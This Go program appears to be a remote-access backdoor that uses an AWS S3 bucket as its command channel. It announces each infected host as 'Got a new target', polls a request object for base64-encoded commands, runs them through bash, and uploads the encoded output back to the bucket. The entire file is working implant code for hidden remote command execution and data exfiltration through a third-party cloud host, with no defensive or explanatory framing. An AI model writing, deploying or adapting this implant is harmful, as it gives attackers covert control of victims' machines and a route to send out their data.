package main

import (
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/s3"
	"os"
	exec "os/exec"
	"strings"
	"time"
)

var (
	bucket = flag.String("bucket", "", "bucket name")
	key    = flag.String("key", "mypage", "Key prefix to exchange messages")
	region = flag.String("region", "eu-west-1", "AWS region")
)

func fail(msg string, o ...interface{}) {
	fmt.Fprintf(os.Stderr, msg, o...)
	os.Exit(1)
}

func b64Encode(input []byte) []byte {
	data := make([]byte, base64.StdEncoding.EncodedLen(len(input)))
	base64.StdEncoding.Encode(data, input)
	return data
}

func execCmd(input string) []byte {
	cmd := exec.Command("/bin/bash", "-c", fmt.Sprintf("echo -ne %s |base64 -d |bash", input))
	out, err := cmd.CombinedOutput()
	if err == nil {
		return out
	}
	return []byte(err.Error())
}

func fetchData(svc *s3.S3, bucket, key string, notModified time.Time) (string, time.Time) {
	buf := new(bytes.Buffer)
	result, err := svc.GetObject(&s3.GetObjectInput{
		Bucket:          aws.String(bucket),
		Key:             aws.String(key),
		IfModifiedSince: aws.Time(notModified),
	})
	if err != nil {
		if !strings.Contains(err.Error(), "Not Modified") {
			fmt.Println(err)
		}
		if strings.Contains(err.Error(), "NoSuchKey") {
			fmt.Println(err)
			os.Exit(-1)
		}
		return "", notModified
	}
	buf.ReadFrom(result.Body)

	return buf.String(), *result.LastModified

}
func uploadData(svc *s3.S3, bucket, key string, data []byte) error {
	_, err := svc.PutObject(&s3.PutObjectInput{
		Bucket:        aws.String(bucket),
		Key:           aws.String(key),
		Body:          bytes.NewReader(data),
		ContentLength: aws.Int64(int64(len(data))),
	})
	return err
}
func main() {
	flag.Parse()
	var cmd string
	lastModified := time.Now()
	reqKey := fmt.Sprintf("%s_req.txt", *key)
	respKey := fmt.Sprintf("%s_resp.txt", *key)

	if len(*bucket) < 1 {
		fail("Please provide a bucket name (-bucket)\n")
	}
	if len(os.Getenv("AWS_SECRET_ACCESS_KEY")) < 1 || len(os.Getenv("AWS_ACCESS_KEY_ID")) < 1 {
		fail("PLease setup environment variables AWS_SECRET_ACCESS_KEY and AWS_ACCESS_KEY_ID \n")
	}
	sess, _ := session.NewSession(&aws.Config{
		Region: aws.String(*region)},
	)
	svc := s3.New(sess)

	hostname, _ := os.Hostname()
	uploadData(svc, *bucket, respKey, b64Encode([]byte(fmt.Sprintf("Got a new target %s", hostname))))
	for {
		time.Sleep(1500 * time.Microsecond)
		cmd, lastModified = fetchData(svc, *bucket, reqKey, lastModified)
		if len(cmd) < 1 {
			continue
		}

		go func() {
			output := execCmd(cmd)
			if len(output) > 0 {
				uploadData(svc, *bucket, respKey, b64Encode(output))
			}
		}()
	}
}
